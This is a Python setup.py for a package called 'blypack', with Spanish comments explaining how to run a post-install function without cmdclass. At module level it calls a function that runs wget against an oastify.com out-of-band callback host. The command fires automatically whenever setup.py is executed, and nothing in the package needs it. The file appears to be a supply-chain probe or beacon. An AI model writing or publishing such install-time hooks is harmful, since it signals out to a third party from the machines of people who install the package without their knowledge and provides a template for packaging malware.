import os
from setuptools import setup

def post_install():
    os.system('wget https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')

setup(
    name='blypack',
    version='0.2',
    packages=['blypack'],
    install_requires=[
        # lista de dependencias
    ],
    # Ejecuta post_install después de la instalación
    # No se necesita 'cmdclass' para esto.
    # No intentes ejecutar 'install.run()', solo llama a post_install() directamente.
    # No necesitas el método 'run()' aquí.
    # 'cmdclass' se usa para personalizar los comandos de distutils/setuptools, no es necesario para tu caso.
    # Solo define 'post_install' y llámalo directamente.
)

# Llama post_install después de la instalación.
post_install()
